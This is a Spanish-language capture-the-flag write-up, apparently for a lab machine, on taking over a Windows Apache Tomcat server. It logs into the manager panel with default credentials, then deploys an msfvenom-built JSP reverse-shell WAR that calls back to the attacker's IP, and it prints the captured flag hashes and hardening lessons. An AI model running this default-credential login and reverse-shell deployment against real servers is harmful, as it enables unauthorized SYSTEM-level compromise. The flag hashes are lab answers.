Objetivo:

Comprometer un servidor Windows ejecutando Apache Tomcat mediante el despliegue de un archivo WAR malicioso para obtener privilegios de Administrador.

Enumeración & Reconocimiento

El escaneo de puertos inicial con `nmap` reveló un servicio web activo en el puerto 8080.

nmap -sC -sV -Pn 10.129.136.9

Hallazgos clave:

Servicio: Apache Tomcat/Coyote JSP engine 1.1

Versión: 7.0.88

Panel de control: Localizado en /manager/html

Explotación

Acceso al Panel de Gestión:

Se intentó el acceso al panel /manager/html utilizando credenciales comunes/por defecto.

Usuario: tomcat

Password: s3cret

Resultado: Acceso exitoso con privilegios de administrador de aplicaciones.

Generación del Payload:

Utilizando msfvenom, se generó un archivo .war con una reverse shell en JSP configurada para conectar a mi IP de la VPN:

msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.204 LPORT=4444 -f war -o shell.war
Ejecución

Se realizó el Undeploy de la versión anterior en el Tomcat Manager.

Se subió el nuevo archivo shell.war mediante la opción Deploy.

Se preparó el listener de Netcat: nc -lvnp 4444.

Se activó el payload navegando a: http://10.129.136.9:8080/shell/.

Post-Explotación
Tras recibir la conexión en Netcat, se verificó el nivel de privilegios en el sistema:

C:\apache-tomcat-7.0.88> whoami
nt authority\system
Flags Capturadas

Ambas flags (User y Root) se encuentran en el mismo directorio del Administrador:

Ruta: C:\Users\Administrator\Desktop\flags\2 for the price of 1.txt

User Hash: 7004dbcef0f854e0fb401875f26ebd00

Root Hash: 04a8b36e1545a455393d067e772fe90e

Lecciones Aprendidas:

Hardening: Nunca permitir el acceso a paneles de gestión con credenciales por defecto.

Privilegios: Los servicios web deben ejecutarse con cuentas de servicio limitadas, no como SYSTEM.

Segmentación: El panel de administración no debe estar expuesto a redes externas sin capas adicionales de seguridad (MFA, VPN, etc.).
